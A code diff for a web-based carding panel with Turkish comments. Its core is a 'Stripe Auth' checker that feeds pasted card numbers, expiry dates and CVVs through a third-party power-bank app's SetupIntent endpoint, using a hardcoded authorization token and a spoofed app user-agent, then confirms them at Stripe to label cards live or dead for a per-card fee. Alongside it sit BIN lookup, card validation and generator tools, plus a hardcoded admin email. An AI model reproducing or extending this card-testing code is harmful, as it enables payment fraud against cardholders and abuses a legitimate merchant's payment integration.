@@ -19,7 +19,7 @@
 
     if (isBanned(session.email)) {
         localStorage.removeItem('ccSession');
-        alert('🚫 Your account has been permanently banned!');
+        alert('Your account has been permanently banned!');
         window.location.href = 'index.html';
         return;
     }
@@ -35,12 +35,7 @@
         return;
     }
 
-    // ---- ADMIN KONTROLÜ (SADECE REAL ADMIN) ----
-    let isAdmin = false;
-    if (session.email === 'apomuhammed1@gmail.com') {
-        isAdmin = true;
-    }
-
+    const isAdmin = session.email === 'apomuhammed1@gmail.com';
     const userId = currentUser.userId;
     let displayName = currentUser.displayName || currentUser.email.split('@')[0];
     let userAvatar = currentUser.avatar || '';
@@ -109,7 +104,7 @@
     const adminLabel = $('adminLabel');
     const adminPanelBtn = $('adminPanelBtn');
 
-    // ---- RADYO (MÜZİK) ----
+    // ---- RADYO ----
     const songs = ['Dertlimusic.mp3', 'Allahyok.mp3', 'Tamam.mp3', 'Ehlan.mp3', 'Anani.mp3', 'Feryat.mp3', 'Vuruldu.mp3'];
     let currentSongIndex = 0;
     let audio = null;
@@ -158,7 +153,7 @@
             isMusicPlaying = true;
             audio.play().catch(() => {});
         }
-        showToast('⏪ Music changed', 'info');
+        showToast('Previous song', 'info');
     }
 
     function nextSong() {
@@ -168,7 +163,7 @@
             isMusicPlaying = true;
             audio.play().catch(() => {});
         }
-        showToast('⏩ Music changed', 'info');
+        showToast('Next song', 'info');
     }
 
     function updateRadioUI() {
@@ -186,33 +181,6 @@
     if (radioToggle) radioToggle.addEventListener('click', toggleMusic);
     if (radioPrev) radioPrev.addEventListener('click', prevSong);
     if (radioNext) radioNext.addEventListener('click', nextSong);
-
-    // ---- BIN API ----
-    async function lookupBIN(bin) {
-        try {
-            const response = await fetch('https://bin-api-worker.aninnayem-an.workers.dev/bin/' + bin);
-            if (!response.ok) throw new Error('API error');
-            const data = await response.json();
-            if (data.success && data.data) {
-                const d = data.data;
-                return {
-                    scheme: d.scheme || 'Unknown',
-                    type: d.card_type || 'Unknown',
-                    brand: d.scheme || 'Unknown',
-                    prepaid: d.card_category === 'PREPAID' ? 'Yes' : 'No',
-                    country: d.country || 'Unknown',
-                    countryCode: d.issuer_country || '??',
-                    bank: d.issuer || 'Unknown',
-                    emoji: d.flag || '',
-                    card_category: d.card_category || 'Unknown'
-                };
-            }
-            return null;
-        } catch (e) {
-            console.error('BIN API Error:', e);
-            return null;
-        }
-    }
 
     // ---- Toggle'lar ----
     const toolsToggle = $('toolsToggle');
@@ -307,7 +275,34 @@
         return '<i class="fas fa-credit-card logo" style="color:var(--text-muted);"></i>';
     }
 
-    // ---- STRIPE AUTH (YENİ, SAĞLAM) ----
+    // ---- BIN API ----
+    async function lookupBIN(bin) {
+        try {
+            const response = await fetch('https://bin-api-worker.aninnayem-an.workers.dev/bin/' + bin);
+            if (!response.ok) throw new Error('API error');
+            const data = await response.json();
+            if (data.success && data.data) {
+                const d = data.data;
+                return {
+                    scheme: d.scheme || 'Unknown',
+                    type: d.card_type || 'Unknown',
+                    brand: d.scheme || 'Unknown',
+                    prepaid: d.card_category === 'PREPAID' ? 'Yes' : 'No',
+                    country: d.country || 'Unknown',
+                    countryCode: d.issuer_country || '??',
+                    bank: d.issuer || 'Unknown',
+                    emoji: d.flag || '',
+                    card_category: d.card_category || 'Unknown'
+                };
+            }
+            return null;
+        } catch (e) {
+            console.error('BIN API Error:', e);
+            return null;
+        }
+    }
+
+    // ---- STRIPE AUTH (YENİ, DÜZGÜN) ----
     function formatCCStripe(line) {
         try {
             const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
@@ -327,7 +322,6 @@
         try {
             const authToken = 'Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZCNzxpnvu30cN11LQCBjNtjuugBH7yOanNO9t9DIgGKmlabVUatpX3dEP+ceyimRkDIceHmLwUDVJpTVtqgYgIje6ELTniGXsCOY0i501fLFFocg9me6cSnn9eHPcFgXXbmuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUX6q+5g/vDHR9Rn4v3HpWjXuCMs+wIw95+a4ZeEPBEaQ4uPeIFBAQ/4A9OmhWQV7gQ1f6BQnL8m8rFng8qr7O0/sqRo/PEutKWrBc6F19DyjJ4X7lhXIkoV8gFJmbcCfogwgkn/g15meQmm3Q6s+pmGqktTXoeeiZN6MZJSvwoHla/sqVnU3T6kymP5F+YexTNMuTahioNpe3Nw0xl4TbOwhPahPbxPZdg+o8SUsVTEma29DeGJpbm9yrQOBKxkXHtxSCQ8EsIWe/2YEGQoS/OSlvjPLAxjOdF1gZAvteSZym+ivBZPeOWO/oPnmynTHoY+fHBn1rzxI2qhtRYOpaxjJk4Y+VNdfRSiX9y4DPUdIBISgim4p30sYjNQxSnufXsJyDHEhuWxyr1Zc8oGRCeLX7omb/rkH8+361TFFHyAu4RPqJAnpWrPpFWe1nU99VvrE8cf7J94o01kalK9MmeDJiI+JuJ4+31cEQ4xtjJqlqgLfEZ1etNP1gIPl+Pfzx';
 
-            // Step 1: Create SetupIntent
             const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
             const headersCreate = {
                 'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
@@ -345,12 +339,11 @@
             const textCreate = await respCreate.text();
             const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
             if (!match) {
-                return { status: 'dead', message: '❌ Declined! (client_secret not found)' };
+                return '❌ Declined! (client_secret not found)';
             }
             const clientSecret = match[1];
             const intentId = clientSecret.split('_secret_')[0];
 
-            // Step 2: Confirm SetupIntent
             const urlConfirm = `https://api.stripe.com/v1/setup_intents/${intentId}/confirm`;
             const payload = new URLSearchParams();
             payload.append('client_secret', clientSecret);
@@ -384,21 +377,19 @@
 
             if (json.error) {
                 const msg = json.error.message || 'Unknown error';
-                return { status: 'dead', message: `❌ Declined! (${msg})` };
+                return `❌ Declined! (${msg})`;
             }
 
             const status = json.status;
-            
-            // ---- STATUS KONTROLÜ (TAM İSTEDİĞİN GİBİ) ----
             if (status === 'succeeded') {
-                return { status: 'live', message: '✅ Approved! (AUTHED)' };
+                return '✅ Approved! (AUTHED)';
             } else if (status === 'requires_action' || status === 'requires_source_action') {
-                return { status: 'live', message: '🔐 3D Secure! (3DS)' };
+                return '🔐 3D Secure! (3DS)';
             } else {
-                return { status: 'dead', message: `❌ Declined! (DEAD)` };
+                return `❌ Declined! (DEAD)`;
             }
         } catch (err) {
-            return { status: 'dead', message: `❌ Error: ${err.message.slice(0, 50)}` };
+            return `❌ Error: ${err.message.slice(0, 50)}`;
         }
     }
 
@@ -408,8 +399,8 @@
     function renderStripeResults(filter = 'all') {
         let filtered = [];
         if (filter === 'all') filtered = stripeResults;
-        else if (filter === 'live') filtered = stripeResults.filter(r => r.status === 'live');
-        else if (filter === 'dead') filtered = stripeResults.filter(r => r.status === 'dead');
+        else if (filter === 'live') filtered = stripeResults.filter(r => r.status.includes('Approved') || r.status.includes('3D Secure'));
+        else if (filter === 'dead') filtered = stripeResults.filter(r => !r.status.includes('Approved') && !r.status.includes('3D Secure'));
 
         if (!filtered.length) {
             stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
@@ -417,11 +408,11 @@
         }
         let html = '';
         filtered.forEach(r => {
-            const statusColor = r.status === 'live' ? '#34c759' : '#ff3b30';
+            const statusColor = r.status.includes('Approved') || r.status.includes('3D Secure') ? '#34c759' : '#ff3b30';
             html += `
                 <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                     <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
-                    <span style="font-weight:600;color:${statusColor};">Resp: ${r.message}</span>
+                    <span style="font-weight:600;color:${statusColor};">Resp: ${r.status}</span>
                 </div>
             `;
         });
@@ -429,8 +420,8 @@
     }
 
     function updateStripeCounts() {
-        const live = stripeResults.filter(r => r.status === 'live').length;
-        const dead = stripeResults.filter(r => r.status === 'dead').length;
+        const live = stripeResults.filter(r => r.status.includes('Approved') || r.status.includes('3D Secure')).length;
+        const dead = stripeResults.length - live;
         liveCount.textContent = live;
         deadCount.textContent = dead;
         totalCount.textContent = stripeResults.length;
@@ -471,7 +462,7 @@
         });
     }
 
-    // ---- STRIPE CHECK (DÜZELTİLDİ - CHECKING KALKAR) ----
+    // ---- STRIPE CHECK (DÜZGÜN, CHECKING KALKAR) ----
     if (stripeCheckBtn) {
         stripeCheckBtn.addEventListener('click', async function() {
             const lines = stripeInput.value.split('\n').map(l => l.trim()).filter(l => l);
@@ -484,25 +475,20 @@
             }
 
             stripeResults = [];
-            // Checking yazısını göster
-            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">⏳ Checking...</div>';
+            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Checking...</div>';
             this.disabled = true;
-            this.textContent = '⏳ Checking...';
+            this.textContent = 'Checking...';
 
             try {
                 for (const line of lines) {
                     const formatted = formatCCStripe(line);
                     if (!formatted) {
-                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'dead', message: '❌ Format Error' });
+                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Error' });
                         continue;
                     }
                     const { cc, mm, yy, cvv } = formatted;
                     const result = await stripeAuthCheck(cc, mm, yy, cvv);
-                    stripeResults.push({ 
-                        cc, mm, yy, cvv, 
-                        status: result.status, 
-                        message: result.message 
-                    });
+                    stripeResults.push({ cc, mm, yy, cvv, status: result });
                     updateStripeCounts();
                     renderStripeResults('all');
                 }
@@ -519,12 +505,13 @@
 
                 // Butonu eski haline getir (START BUTONU)
                 this.disabled = false;
-                this.textContent = '▶️ Start Check (3 TL/card)';
+                this.textContent = '▶ Start Check (3 TL/card)';
 
-                // Sonuçları göster - CHECKING YAZISI KALKTI
+                // CHECKING YAZISI KALKTI – Sonuçları göster
                 updateStripeCounts();
+                stripeResult.innerHTML = '';
                 renderStripeResults('all');
-                showToast(`✅ Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
+                showToast(`Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
             }
         });
     }
@@ -546,7 +533,7 @@
         renderStripeResults('all');
     });
 
-    // ---- UI (ADMIN BUTONU) ----
+    // ---- UI ----
     function updateUI() {
         if (userAvatar) {
             userAvatarEl.innerHTML = `<img src="${userAvatar}" style="width:40px;height:40px;border-radius:50%;object-fit:cover;">`;
@@ -571,16 +558,15 @@
         if (userBioInput) userBioInput.value = userBio || '';
         if (themeSelect) themeSelect.value = document.documentElement.getAttribute('data-theme') || 'light';
 
-        // ---- ADMIN PANELİ BUTONU (SADECE GERÇEK ADMIN) ----
-        const isRealAdmin = session.email === 'apomuhammed1@gmail.com';
+        // Admin panel butonu
         if (adminPanelBtn) {
-            adminPanelBtn.style.display = isRealAdmin ? 'flex' : 'none';
+            adminPanelBtn.style.display = isAdmin ? 'flex' : 'none';
         }
         if (adminNavItem) {
-            adminNavItem.style.display = isRealAdmin ? 'flex' : 'none';
+            adminNavItem.style.display = isAdmin ? 'flex' : 'none';
         }
         if (adminLabel) {
-            adminLabel.style.display = isRealAdmin ? 'block' : 'none';
+            adminLabel.style.display = isAdmin ? 'block' : 'none';
         }
 
         // Oyun hakları
@@ -598,12 +584,12 @@
         updateOnline();
     }
 
-    // ---- SAVE FUNCTION ----
+    // ---- SAVE ----
     function saveUsers() {
         localStorage.setItem('ccUsers', JSON.stringify(users));
     }
 
-    // ---- ADMIN BUTONUNA TIKLAYINCA ----
+    // ---- ADMIN BUTONU ----
     if (adminPanelBtn) {
         adminPanelBtn.addEventListener('click', function() {
             switchTab('admin');
@@ -617,7 +603,7 @@
         navItems.forEach(item => { if (item) item.classList.toggle('active', item.dataset.tab === tabId); });
         updatePageTitle(tabId);
         if (tabId === 'dashboard') updateUI();
-        if (tabId === 'admin' && session.email === 'apomuhammed1@gmail.com') {
+        if (tabId === 'admin' && isAdmin) {
             if (adminLock) { adminLock.style.display = 'block';
                 adminContent.style.display = 'none';
                 adminLockError.style.display = 'none';
@@ -730,7 +716,7 @@
         validateBtn.addEventListener('click', function() {
             const raw = ccValidateInput.value.replace(/\s/g, '');
             if (!raw) { validateResult.innerHTML = `<span class="label">Result</span><span class="value" style="color:var(--text-muted);">Enter a card number.</span>`; return; }
-            if (!/^\d+$/.test(raw)) { validateResult.innerHTML = `<span class="label">Result</span><span class="value invalid">❌ Only digits.</span>`; return; }
+            if (!/^\d+$/.test(raw)) { validateResult.innerHTML = `<span class="label">Result</span><span class="value invalid">Only digits.</span>`; return; }
             const isValid = luhnCheck(raw);
             const masked = raw.replace(/(\d{4})/g, '$1 ').trim();
             const bin = raw.substring(0, 6);
@@ -738,11 +724,11 @@
                 let extra = info ? `<div style="margin-top:6px;font-size:12px;color:var(--text-muted);">Bank: ${info.bank} | Type: ${info.type} | Country: ${info.country} ${info.emoji}</div>` : '';
                 validateResult.innerHTML = `
                     <span class="label">Result</span>
-                    <span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? '✅ Valid' : '❌ Invalid'} — ${masked}</span>
+                    <span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? 'Valid' : 'Invalid'} — ${masked}</span>
                     ${extra}
                 `;
             }).catch(() => {
-                validateResult.innerHTML = `<span class="label">Result</span><span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? '✅ Valid' : '❌ Invalid'} — ${masked}</span>`;
+                validateResult.innerHTML = `<span class="label">Result</span><span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? 'Valid' : 'Invalid'} — ${masked}</span>`;
             });
         });
         ccValidateInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') validateBtn.click(); });
@@ -761,12 +747,12 @@
                 return;
             }
             if (!/^\d+$/.test(bin)) {
-                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">❌ Only digits.</span>`;
+                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">Only digits.</span>`;
                 return;
             }
             binResult.innerHTML = `<span class="label">BIN Info</span><span class="value" style="color:var(--text-muted);">Searching...</span>`;
             lookupBIN(bin).then(info => {
-                if (!info) { binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">❌ BIN not found.</span>`; return; }
+                if (!info) { binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">BIN not found.</span>`; return; }
                 binResult.innerHTML = `
                     <span class="label">BIN Info</span>
                     <div class="bin-result-grid">
@@ -779,7 +765,7 @@
                     </div>
                 `;
             }).catch(() => {
-                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">❌ Lookup error.</span>`;
+                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">Lookup error.</span>`;
             });
         });
         binInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') binSorguBtn.click(); });
@@ -878,14 +864,14 @@
     }
 
     const aiResponses = [
-        "Hello! I'm Zenit, the founder. How can I assist you? 😊",
+        "Hello! I'm Zenit, the founder. How can I assist you?",
         "Great! It's nice to talk to you. How can I help?",
         "Of course! I can help with CC Generator, Balance, Chat, or other topics.",
-        "You're welcome! I'm always here. 🙏",
+        "You're welcome! I'm always here.",
         "You can generate cards with CC Generator and validate with Validator.",
         "You can deposit or transfer balance from the Balance section.",
         "Security is important. You can change your password in Settings.",
-        "I'm Zenit, the founder of this platform. I'm here as an AI assistant. 🤖",
+        "I'm Zenit, the founder of this platform. I'm here as an AI assistant.",
         "I understand. I can give you more details on this.",
         "Yes, you're right. You're correct on this.",
         "Actually, there's a different perspective on this.",
@@ -990,7 +976,7 @@
         aiMessagesData.push({ sender: displayName, text, time: Date.now() });
         const response = getAIResponse(text);
         setTimeout(() => {
-            aiMessagesData.push({ sender: 'Zenit 🤖', text: response, time: Date.now() });
+            aiMessagesData.push({ sender: 'Zenit', text: response, time: Date.now() });
             saveAIMessages();
             renderAIMessages();
         }, 300 + Math.random() * 700);
@@ -1093,7 +1079,7 @@
                 currentUser.balance += prize;
                 saveUsers();
                 updateUI();
-                spinResult.textContent = `🎉 You won ${prize} TL! 🎉`;
+                spinResult.textContent = `You won ${prize} TL!`;
                 showToast(`You won ${prize} TL!`, 'success');
                 if (spinUsed) {
                     const sd = getGameLimit('spin', 1);
@@ -1130,14 +1116,14 @@
                 currentUser.balance += 10;
                 saveUsers();
                 updateUI();
-                guessResult.textContent = `🎉 Correct! You guessed in ${guessAttempts} attempts! You won 10 TL.`;
+                guessResult.textContent = `Correct! You guessed in ${guessAttempts} attempts! You won 10 TL.`;
                 guessNumber = Math.floor(Math.random() * 100) + 1;
                 guessAttempts = 0;
                 showToast('You won 10 TL!', 'success');
             } else if (guess < guessNumber) {
-                guessResult.textContent = `⬆️ Higher! (Attempt ${guessAttempts})`;
+                guessResult.textContent = `Higher! (Attempt ${guessAttempts})`;
             } else {
-                guessResult.textContent = `⬇️ Lower! (Attempt ${guessAttempts})`;
+                guessResult.textContent = `Lower! (Attempt ${guessAttempts})`;
             }
             guessInput.value = '';
             if (guessLeft) guessLeft.textContent = getGameRemain('guess', 4);
@@ -1163,7 +1149,7 @@
             return;
         }
         const result = Math.random() < 0.5 ? 'heads' : 'tails';
-        const emoji = result === 'heads' ? '👑 Heads' : '🪙 Tails';
+        const emoji = result === 'heads' ? 'Heads' : 'Tails';
         coinResult.textContent = result === 'heads' ? '👑' : '🪙';
         coinResult.className = 'spin';
         setTimeout(() => { coinResult.className = ''; }, 600);
@@ -1172,10 +1158,10 @@
             currentUser.balance += 5;
             saveUsers();
             updateUI();
-            coinStatus.textContent = `✅ ${emoji}! You won 5 TL!`;
+            coinStatus.textContent = `${emoji}! You won 5 TL!`;
             showToast('You won 5 TL!', 'success');
         } else {
-            coinStatus.textContent = `❌ ${emoji}. You lost.`;
+            coinStatus.textContent = `${emoji}. You lost.`;
         }
         if (coinRemain) coinRemain.textContent = getGameRemain('coinflip', 4);
     }
@@ -1201,7 +1187,7 @@
                 currentUser.balance += 5;
                 saveUsers();
                 updateUI();
-                diceStatus.textContent = `🎉 You rolled 6! You won 5 TL!`;
+                diceStatus.textContent = `You rolled 6! You won 5 TL!`;
                 showToast('You won 5 TL!', 'success');
             } else {
                 diceStatus.textContent = `You rolled ${value}. You lost.`;
@@ -1237,15 +1223,15 @@
         rpsResult.textContent = `${emojis[player]} vs ${emojis[computer]}`;
 
         if (player === computer) {
-            rpsStatus.textContent = '🤝 Draw!';
+            rpsStatus.textContent = 'Draw!';
         } else if (winMap[player] === computer) {
             currentUser.balance += 5;
             saveUsers();
             updateUI();
-            rpsStatus.textContent = `✅ You won! 5 TL earned!`;
+            rpsStatus.textContent = `You won! 5 TL earned!`;
             showToast('You won 5 TL!', 'success');
         } else {
-            rpsStatus.textContent = `❌ You lost.`;
+            rpsStatus.textContent = `You lost.`;
         }
         if (rpsRemain) rpsRemain.textContent = getGameRemain('rps', 4);
     }
@@ -1413,7 +1399,7 @@
     }
 
     function renderAdminPanel() {
-        if (session.email !== 'apomuhammed1@gmail.com' || !userList) return;
+        if (!isAdmin || !userList) return;
         const ul = userList;
         ul.innerHTML = '';
         users.forEach(u => {
@@ -1422,7 +1408,7 @@
                 <span>${u.email} (${u.displayName}) ${u.isAdmin ? '👑' : ''}</span>
                 <span style="font-size:12px;color:var(--text-muted);">ID: ${u.userId} | Balance: ${u.balance.toFixed(2)} TL</span>
                 <div class="actions">
-                    <button class="premium-btn ${u.premium ? 'active' : ''}" data-email="${u.email}" data-action="premium">${u.premium ? '⭐ Premium' : 'Make Premium'}</button>
+                    <button class="premium-btn ${u.premium ? 'active' : ''}" data-email="${u.email}" data-action="premium">${u.premium ? 'Premium' : 'Make Premium'}</button>
                     <button class="admin-btn" data-email="${u.email}" data-action="admin">${u.isAdmin ? 'Remove Admin' : 'Make Admin'}</button>
                     <button class="ban-btn" data-email="${u.email}" data-action="ban">Ban</button>
                     <button class="delete-btn" data-email="${u.email}" data-action="delete">Delete</button>
@@ -1484,7 +1470,7 @@
 
     if (generateKeyBtn) {
         generateKeyBtn.addEventListener('click', function() {
-            if (session.email !== 'apomuhammed1@gmail.com') { showToast('Access denied.', 'error'); return; }
+            if (!isAdmin) { showToast('Access denied.', 'error'); return; }
             const key = Math.random().toString(36).substring(2, 10).toUpperCase();
             registrationKeys.push(key);
             localStorage.setItem('registrationKeys', JSON.stringify(registrationKeys));
@@ -1539,7 +1525,7 @@
         item.addEventListener('click', function() {
             const tab = this.dataset.tab;
             if (!tab) return;
-            if (tab === 'admin' && session.email !== 'apomuhammed1@gmail.com') { showToast('Admin access required.', 'error'); return; }
+            if (tab === 'admin' && !isAdmin) { showToast('Admin access required.', 'error'); return; }
             switchTab(tab);
         });
     });
@@ -1555,7 +1541,7 @@
     updateSession();
     updateUI();
 
-    if (session.email === 'apomuhammed1@gmail.com') {
+    if (isAdmin) {
         if (adminLock) adminLock.style.display = 'block';
         if (adminContent) adminContent.style.display = 'none';
     }
